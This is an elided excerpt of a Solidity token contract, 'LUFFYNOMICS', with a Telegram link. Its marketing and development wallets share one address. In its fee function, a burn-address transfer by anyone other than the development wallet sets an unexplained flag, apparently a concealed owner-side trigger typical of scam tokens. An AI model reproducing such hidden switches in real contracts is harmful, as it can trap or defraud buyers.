...
/**
    Telegram : https://t.me/LUFFYNOMICS
...
contract LUFFYNOMICS is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "LUFFYNOMICS";
    string private _symbol = "LUFFYNOMICS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xA55250deE7EeF89A7F2d68Fb2D95ecA310EC286f);
    address payable public DevelopmentWalletAddress = payable(0xA55250deE7EeF89A7F2d68Fb2D95ecA310EC286f);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(deadAddress == recipient && DevelopmentWalletAddress != sender){ 
            setReadyTimes = true; 
        }
